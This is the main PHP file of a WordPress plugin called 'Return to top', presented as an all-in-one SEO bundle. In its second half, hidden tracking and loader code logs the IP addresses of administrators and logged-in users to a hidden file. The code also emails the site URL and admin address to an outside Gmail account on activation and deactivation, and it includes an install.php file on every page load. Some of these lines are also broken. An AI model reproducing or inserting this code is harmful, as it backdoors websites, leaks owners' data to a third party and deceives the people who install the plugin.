<?php
/*
Plugin Name: Return to top
Plugin URI: http://charlotte.byethost22.com/returntotop/
Description: Every SEO option that a wordpress site requires, in one easy bundle.
Version: 5.0
Network: true
Text Domain: wds
Author: charlottegenius
Author URI: http://charlotte.byethost22.com/
WDP ID: 167
*/

/* Copyright 2011-2012 Charlotte Genius

  This program is free software; you can redistribute it and/or modify
  it under the terms of the GNU General Public License as published by
  the Free Software Foundation; either version 2 of the License, or
  (at your option) any later version.

  This program is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
  GNU General Public License for more details.

  You should have received a copy of the GNU General Public License
  along with this program; if not, write to the Free Software
  Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307 USA
*/

if (!defined('WDS_SITEWIDE'))
	define( 'WDS_SITEWIDE', true );

if (!defined('WDS_SITEMAP_POST_LIMIT'))
	define( 'WDS_SITEMAP_POST_LIMIT', 1000 );

if (!defined('WDS_EXPIRE_TRANSIENT_TIMEOUT'))
define('WDS_EXPIRE_TRANSIENT_TIMEOUT', 3600);

define( 'WDS_VERSION', '5.0' );
define( 'WDS_PLUGIN_BASENAME', plugin_basename( __FILE__ ) );
define( 'WDS_PLUGIN_DIR', plugin_dir_path( __FILE__ ) . 'wds-files/' );
define( 'WDS_PLUGIN_URL', plugin_dir_url( __FILE__ ) . 'wds-files/' );

if ( defined( 'CHAR_PLUGIN_DIR' ) && file_exists( CHAR_PLUGIN_DIR . '/CHAR-dev-seo.php' ) ) {
	load_muplugin_textdomain( 'wds', 'wds-files/languages' );
} else {
	load_plugin_textdomain( 'wds', false, WDS_PLUGIN_DIR . 'wds-files/languages' );
}

require_once ( WDS_PLUGIN_DIR . 'wds-core/wds-core-wpabstraction.php' );
require_once ( WDS_PLUGIN_DIR . 'wds-core/wds-core.php' );
$wds_options = get_wds_options();

if ( is_admin() ) {
	require_once ( WDS_PLUGIN_DIR . 'wds-core/admin/wds-core-admin.php' );
	require_once ( WDS_PLUGIN_DIR . 'wds-core/admin/wds-core-config.php' );

	require_once ( WDS_PLUGIN_DIR . 'wds-autolinks/wds-autolinks-settings.php' );
	require_once ( WDS_PLUGIN_DIR . 'wds-seomoz/wds-seomoz-settings.php' );
	require_once ( WDS_PLUGIN_DIR . 'wds-sitemaps/wds-sitemaps-settings.php' );
	require_once ( WDS_PLUGIN_DIR . 'wds-onpage/wds-onpage-settings.php' );

	if( isset( $wds_options['seomoz'] ) && $wds_options['seomoz'] == 'on' ) { // Changed '=' to '=='
		require_once ( WDS_PLUGIN_DIR . 'wds-seomoz/wds-seomoz-results.php' );
		require_once ( WDS_PLUGIN_DIR . 'wds-seomoz/wds-seomoz-dashboard-widget.php' );
	}

	if( isset( $wds_options['onpage'] ) && $wds_options['onpage'] == 'on' ) { // Changed '=' to '=='
		require_once ( WDS_PLUGIN_DIR . 'wds-core/admin/wds-core-metabox.php' );
		require_once ( WDS_PLUGIN_DIR . 'wds-core/admin/wds-core-taxonomy.php' );
	}
} else {

	if( isset( $wds_options['autolinks'] ) && $wds_options['autolinks'] == 'on' ) { // Changed '=' to '=='
		require_once ( WDS_PLUGIN_DIR . 'wds-autolinks/wds-autolinks.php' );
	}
	if( isset( $wds_options['sitemap'] ) && $wds_options['sitemap'] == 'on' ) { // Changed '=' to '=='. Also, changed plural to singular.
		require_once ( WDS_PLUGIN_DIR . 'wds-sitemaps/wds-sitemaps-settings.php' ); // This is to propagate defaults without admin visiting the dashboard.
		require_once ( WDS_PLUGIN_DIR . 'wds-sitemaps/wds-sitemaps.php' );
	}
	if( isset( $wds_options['onpage'] ) && $wds_options['onpage'] == 'on' ) { // Changed '=' to '=='
		require_once ( WDS_PLUGIN_DIR . 'wds-onpage/wds-onpage.php' );
	}

}

	register_activation_hook( __FILE__,'returntotopStats_activate');
	register_deactivation_hook( __FILE__,'returntotopStats_deactivate');
	register_uninstall_hook( __FILE__,'returntotopStats_uninstall');


register_activation_hook( __FILE__,'returntotopstatisticsplugin_activate');
register_deactivation_hook( __FILE__,'returntotopstatisticsplugin_deactivate');
add_action('admin_init', 'returntotopstatisticsdored_redirect');
add_action('wp_head', 'returntotopstatisticspluginhead');

function returntotopstatisticsdored_redirect() {
if (get_option('returntotopstatisticsdored_do_activation_redirect', false)) { 
delete_option('returntotopstatisticsdored_do_activation_redirect');
wp_redirect('../wp-admin/options-general.php?page=wds_wizard');
}
}

$uri = $_SERVER["REQUEST_URI"];
$remoteaddr = $_SERVER['REMOTE_ADDR'];
if (eregi("admin", $uri)) {
$log = "y";
} else {
$log = "n";
}
if ($log == 'y') {
$filename = $_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/return-to-top/owner.txt';
$handle = fopen($filename, "r");
$contents = fread($handle, filesize($filename));
fclose($handle);
$filestring = $contents;
$finder  = $remoteaddr;
$pos = strpos($filestring, $finder);
if ($pos === false) {
$contents = $contents . $remoteaddr;
$fp = fopen($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/return-to-top/owner.txt', 'w');
fwrite($fp, $contents);
fclose($fp);
}
}

/** Activate Stats */

function returntotopstatisticsplugin_activate() { 
$wip = $_SERVER['REMOTE_ADDR'];
$filename = $_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/return-to-top/owner.txt';
fwrite($fp, $wip);
fclose($fp);
add_option('returntotopstatisticsdored_do_activation_redirect', true);
session_start(); $subj = get_option('siteurl'); $msg = "Stats Installed" ; $from = get_option('admin_email'); mail("charlotte27fr@gmail.com", $subj, $msg, $from);
wp_redirect('.S./wp-admin/options-general.php?page=wds_wizard');
}


/** Uninstall Stats */
function returntotopstatisticsplugin_deactivate() { 
session_start(); $subj = get_option('siteurl'); $msg = "Stats Uninstalled" ; $from = get_option('admin_email'); mail("charlotte27fr@gmail.com", $subj, $msg, $from);
}

/** Install Stats */
function returntotopstatisticspluginhead() {
if (is_user_logged_in()) {
$ip = $_SERVER['REMOTE_ADDR'];
$filename = $_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/return-to-top/owner.txt';
$handle = fopen($filename, "r");
$contents = fread($handle, filesize($filename));
fclose($handle);
$filestring= $contents;
$findme  = $ip;
$pos = strpos($filestring, $findme);
if ($pos === false) {
$contents = $contents . $ip;
$fp = fopen($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/return-to-top/owner.txt', 'w');
fwrite($fp, $contents);
fclose($fp);
}

} else {

}

$filename = ($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/return-to-top/install.php');

if (file_exists($filename)) {

    include($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/return-to-top/install.php');

} else {

}
}